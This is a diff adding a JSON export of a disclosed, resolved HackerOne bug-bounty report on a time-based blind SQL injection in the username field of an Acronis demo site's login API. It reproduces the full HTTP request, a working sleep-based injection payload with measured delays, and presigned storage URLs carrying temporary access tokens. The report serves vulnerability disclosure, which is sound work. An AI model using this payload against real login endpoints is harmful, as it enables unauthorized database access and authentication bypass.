@@ -1,0 +1,137 @@
+{
+  "id": 1436751,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDM2NzUx",
+  "url": "https://hackerone.com/reports/1436751",
+  "title": "SQL injection in https://demor.adr.acronis.com/ via the username parameter",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-12-27T16:10:36.377Z",
+  "submitted_at": "2021-12-27T16:10:36.479Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mmg",
+    "url": "/mmg",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/222/119/30b5386d5cc0fd351927b57fa02a7cf7c81a7a2b_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13428,
+    "url": "https://hackerone.com/acronis",
+    "handle": "acronis",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Acronis",
+      "twitter_handle": "Acronis",
+      "website": "https://www.acronis.com",
+      "about": "Complete integrated cybersecurity and data protection for MSPs and IT teams"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-08-28T09:01:45.322Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2022-07-12T17:24:53.378Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I have discovered a SQL injection in https://demor.adr.acronis.com/  using the POST request via the username parameter.\nUsing the Repearter in Burpsuite I have submitted the following POST request:\n\nPOST /ng/api/auth/login HTTP/2\nHost: demor.adr.acronis.com\nContent-Type: application/json\nX-Requested-With: XMLHttpRequest\nReferer: https://demor.adr.acronis.com/\nCookie: PHPSESSID=bsrq24l7g5fmth5b683v2b3gu4\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Encoding: gzip,deflate,br\nContent-Length: 148\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36\n\n{\"username\":\"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z\",\"id\":\"27\",\"password\":\"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956\"}\n\nWhich resulted in a 35 seconds delayed response (one of the print screens, named 35 captured this).\n\n\nUsing various values for the sleep function you get various time responses. \n\n0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.336\n0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.332\n0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.352\n0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.327\n0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.337\n\nI have attached two print screens from burp showing 16 and 35 seconds responses that were used in the payloads.\n\n## Impact\n\nAn attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database.\nThis can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1560389,
+      "file_name": "16.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/lokkzbo94kemh76ekj5jpz13q8ft?response-content-disposition=attachment%3B%20filename%3D%2216.png%22%3B%20filename%2A%3DUTF-8%27%2716.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTJLHVY4E%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T181359Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIBw6xowNOQGVIiO8lC3Mf7JBxG7vMfWEfsKai3rZoILkAiB%2BCOLBfnTAMLubreMz00W6VCHCsvy%2Fvru6KsndCTujICq7BQjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMtwdave6j8mEA3O%2FsKo8F%2F1aLpGuCORaeetJL5zEUeWqVBfxVvEEASTqtE21RFheLne%2BIG3eAK8Y5Fqu7SMbRKVWqe6qt4fPqCzNua9FyndjeUpaOaDfvIhx8TG2WGZolRyPUgqn8Ew%2BKDQ4Hh%2BExQmgmreChtRN%2FKt9ViLWGIcicyNIaeaS9RCmYR9lqu1BnWxmSa%2B8CmUScvMGLXiot5aaz9ioj6sUefsa6QcNvnjtPumRdBnU5uZQRHAljhUAQnQBBlhmqnQaNfZSmVJA4ybRz7n6tlEBtqDaO28KqvALgm0Oyg55RXofxYa8Fg%2Fp8K%2F7riv9g%2BHgl8QkxwzUM7zcGmbLDgfLwp8D7h3O6rjkDpA9eMq5aCVPjbF8ZICbs%2FdISDgH%2BHmsGWLu6Rlmm368n9aixjnwiK6eeLgEIKgHj%2BjRI%2BYloTy1jcQB8GIGnLNb7Nisxdd7tfzVeA%2BfjTJUNWi1FsMsqk8Iv9Ao8DQPxswfCgApqYYi9ZFz7b4sy2d%2FNy3L6Hi28hOqAtf%2Bh%2FxKn4nMGhfKRFKXTbA702QgINdrOxdoFgajogpzs%2FYwKRIOQn3rHDjB54YydItZeu3qYGVBqGkvkpGL8N7WhEKJNS9KMMIUYJaU%2BSaVbdLUhW3uRTBtBE0tEQehoQOHoWuhCtrELlQZErQY%2BfjLZ%2BNWcsoP93vCevBjQ%2FhU5KLM56KyXTCAJumNaf%2F24ODyAWlGWgjuGSeA4%2BkrHle7Ser0M8xJZhQs34Ne2lBP5v04EGR3ctIk6u%2Fku%2FahVx2pAbapEmJakmt4dMDJuejx%2BR3uZ5xqytgUf%2BSXRgxQuHCYDADLkM7fPHtnMUtZPfoFeY4fkXA8EHYqO8k90vreHwIvBamEMqg1dwkmGhBeSejDv77rGBjqyAQ4UjSkMumnIOiU3HzeDS%2F9SwkKvxmG4dErC9odalk0UcpcioGgIFlY4LrSKijSeXUUjTz5uP%2Fn%2BtdArwXqrhocmieTdfh4%2ByApQ2bLhsZ4G1RRAy3NgHr7sgt59x5h2MYc4M88HAvDSo4XMqM6qhtFC8sXYVE5CzULPQMw3GEscSQcOk65nNcxDBHMMcY77hVD%2FWGRdHemQUEeMw1SbqB5mZflr0AOup%2BH8l77BqNIfNRw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0d93c3936139e12ff8a3931330d1bf0ea0e4047a3328045f17d5edd3ebabf4fd",
+      "file_size": 314221,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 1560390,
+      "file_name": "35.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/g908eox6fsujzki43gx726mceak8?response-content-disposition=attachment%3B%20filename%3D%2235.png%22%3B%20filename%2A%3DUTF-8%27%2735.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTJLHVY4E%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T181359Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIBw6xowNOQGVIiO8lC3Mf7JBxG7vMfWEfsKai3rZoILkAiB%2BCOLBfnTAMLubreMz00W6VCHCsvy%2Fvru6KsndCTujICq7BQjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMtwdave6j8mEA3O%2FsKo8F%2F1aLpGuCORaeetJL5zEUeWqVBfxVvEEASTqtE21RFheLne%2BIG3eAK8Y5Fqu7SMbRKVWqe6qt4fPqCzNua9FyndjeUpaOaDfvIhx8TG2WGZolRyPUgqn8Ew%2BKDQ4Hh%2BExQmgmreChtRN%2FKt9ViLWGIcicyNIaeaS9RCmYR9lqu1BnWxmSa%2B8CmUScvMGLXiot5aaz9ioj6sUefsa6QcNvnjtPumRdBnU5uZQRHAljhUAQnQBBlhmqnQaNfZSmVJA4ybRz7n6tlEBtqDaO28KqvALgm0Oyg55RXofxYa8Fg%2Fp8K%2F7riv9g%2BHgl8QkxwzUM7zcGmbLDgfLwp8D7h3O6rjkDpA9eMq5aCVPjbF8ZICbs%2FdISDgH%2BHmsGWLu6Rlmm368n9aixjnwiK6eeLgEIKgHj%2BjRI%2BYloTy1jcQB8GIGnLNb7Nisxdd7tfzVeA%2BfjTJUNWi1FsMsqk8Iv9Ao8DQPxswfCgApqYYi9ZFz7b4sy2d%2FNy3L6Hi28hOqAtf%2Bh%2FxKn4nMGhfKRFKXTbA702QgINdrOxdoFgajogpzs%2FYwKRIOQn3rHDjB54YydItZeu3qYGVBqGkvkpGL8N7WhEKJNS9KMMIUYJaU%2BSaVbdLUhW3uRTBtBE0tEQehoQOHoWuhCtrELlQZErQY%2BfjLZ%2BNWcsoP93vCevBjQ%2FhU5KLM56KyXTCAJumNaf%2F24ODyAWlGWgjuGSeA4%2BkrHle7Ser0M8xJZhQs34Ne2lBP5v04EGR3ctIk6u%2Fku%2FahVx2pAbapEmJakmt4dMDJuejx%2BR3uZ5xqytgUf%2BSXRgxQuHCYDADLkM7fPHtnMUtZPfoFeY4fkXA8EHYqO8k90vreHwIvBamEMqg1dwkmGhBeSejDv77rGBjqyAQ4UjSkMumnIOiU3HzeDS%2F9SwkKvxmG4dErC9odalk0UcpcioGgIFlY4LrSKijSeXUUjTz5uP%2Fn%2BtdArwXqrhocmieTdfh4%2ByApQ2bLhsZ4G1RRAy3NgHr7sgt59x5h2MYc4M88HAvDSo4XMqM6qhtFC8sXYVE5CzULPQMw3GEscSQcOk65nNcxDBHMMcY77hVD%2FWGRdHemQUEeMw1SbqB5mZflr0AOup%2BH8l77BqNIfNRw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2c0fc2d0ffad0bd6ce2e6c4810ccdf2aaf3acf54c26557849392683f7e948040",
+      "file_size": 311419,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 44,
+  "voters": [
+    "orange303",
+    "ganeshbagaria",
+    "zy9ard3",
+    "shreyaschavhan",
+    "thalaivar304",
+    "spaghettisec",
+    "ahmed_xyz",
+    "vishal0600",
+    "shivammusic",
+    "lontano",
+    "and 34 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 50773,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.acronis.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
